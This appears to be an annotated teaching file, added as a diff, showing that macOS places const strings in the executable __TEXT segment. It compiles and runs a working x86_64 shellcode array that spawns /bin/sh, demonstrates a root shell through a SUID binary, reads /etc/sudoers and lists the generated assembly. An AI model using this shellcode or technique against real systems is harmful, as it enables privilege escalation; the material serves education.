@@ -1,0 +1,139 @@
+//
+// This example shows that immutable (constant) strings are placed by
+//  the compiler in the same __TEXT segment as code. That segment
+//  is write-protected (i.e., any instruction attempting to write to
+//  the memory page where it's been loaded will cause a segmentation fault).
+//  This write protection is apparently presumed to be much more important
+//  than being executable---and so, to save space, the compiler places
+//  the section with the string constant in the same page as the code
+//  (which is executable and non-writable). As a result, we can jump
+//  to the address where the string starts, and have it executed by the CPU
+//  as code!
+
+$ cat exec.c
+#include <unistd.h>
+
+// Shell code from:
+//   http://dustin.schultz.io/blog/2010/11/25/51-byte-x86_64-os-x-null-free-shellcode/ ,
+/    http://dustin.schultz.io/blog/2010/11/15/mac-os-x-64-bit-assembly-system-calls/ .    
+//
+//   See also: http://ligocki.tumblr.com/post/5174133459/writing-shellcode-under-mac-os-x-part-0x01
+//   on how to get such code from the compiler.
+
+// This code starts a shell. Compare it to execve( "/bin/sh", NULL, NULL );
+// const is important. Without const, you'll get a "Bus error", a.k.a. "Segmentation fault",
+//  i.e., a violation of a memory page's declared purpose (executable or not).
+const char shellcode[] =
+     "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
+     "\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
+     "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
+     "\x2f\x73\x68";
+
+int main()
+{
+     void (*f)(void);
+     f = ( void (*)(void) ) shellcode;  // convert the byte array pointer to the function pointer
+     f();                               // call the functon
+}
+
+// If you don't convert the type, you'll get the following warning:
+
+firefly:x86 user$ gcc -Wall -O2 -o exec exec.c
+exec.c:14:8: warning: incompatible pointer types assigning to 'void (*)(void)' from 'char [52]' [-Wincompatible-pointer-types]
+     f = shellcode;
+       ^ ~~~~~~~~~
+1 warning generated.
+
+
+$ gcc -Wall -o exec exec.c
+
+// So running this code starts a shell!
+
+$ ./exec
+sh-3.2$ id
+uid=502(user) gid=20(staff) groups=20(staff),502(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(com.apple.sharepoint.group.2),33(_appstore),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh)
+sh-3.2$ whoami 
+user
+sh-3.2$ exit
+
+// So, what's the big deal? The shell is still running with the privileges of the same user.
+//  The thing, however, is that if we manage to feed that shellcode to a program running as 'root'
+//   then we'll get the shell as root. On how to do the feeding, read http://phrack.org/issues/49/14.html
+//  Measures such as stack canaries (__stack_chk_guard) and DEP protect against just such exploit techniques.
+
+// So, to test this shellcode, we'll make the executable run as root. This is called "SUID root".
+//   See http://www.linuxnix.com/suid-set-suid-linuxunix/ for more.
+
+$ chmod u+s ./exec
+$ ls -l exec
+-rwsr-xr-x 1 user staff 4352 Apr  7 00:05 exec
+$ chown root exec
+chown: changing ownership of 'exec': Operation not permitted
+$ sudo chown root exec
+Password:
+$ ls -l exec
+-rwsr-xr-x 1 root staff 4352 Apr  7 00:05 exec
+
+// OK, so now we have exec SUID root. And, when started, it gives us a root shell.
+
+$ ./exec 
+sh-3.2# id
+uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh),702(com.apple.sharepoint.group.2)
+sh-3.2# whoami
+root
+
+// So we can read some files we can't normally read:
+
+sh-3.2# cat /private/etc/sudoers 
+# sudoers file.
+#
+# This file MUST be edited with the 'visudo' command as root.
+# Failure to use 'visudo' may result in syntax or file permission errors
+# that prevent sudo from running.
+#
+# See the sudoers man page for the details on how to write a sudoers file.
+#
+<skipped>
+
+sh-3.2# exit
+
+// Can't normally read it as my own user:
+
+$ cat /private/etc/sudoers 
+cat: /private/etc/sudoers: Permission denied
+$ 
+
+// Finally, now that you are properly puzzled by all this, here's what
+//   the code looks:
+
+$ gcc -S exec.c
+$ grep -v cfi exec.s  > exec1.s
+$ cat exec1.s
+	.section	__TEXT,__text,regular,pure_instructions
+	.macosx_version_min 10, 10
+	.globl	_main
+	.align	4, 0x90
+_main:                                  ## @main
+## BB#0:
+	pushq	%rbp
+Ltmp0:
+Ltmp1:
+	movq	%rsp, %rbp
+Ltmp2:
+	subq	$16, %rsp
+	leaq	_shellcode(%rip), %rax
+	movq	%rax, -8(%rbp)
+	callq	*-8(%rbp)       // <-- Load the address in -8(%rbp) into RIP (and push the return address, that of the next xorl, on the stack)
+	xorl	%eax, %eax
+	addq	$16, %rsp
+	popq	%rbp
+	retq
+
+	.section	__TEXT,__const    // <--- This is still the executable __TEXT segment!
+	.globl	_shellcode              ## @shellcode
+	.align	4
+_shellcode:
+	.asciz	"A\260\002I\301\340\030I\203\310\0271\377L\211\300\017\005\353\022_I\203\300$L\211\300H1\322RWH\211\346\017\005\350\351\377\377\377/bin//sh"
+
+
+
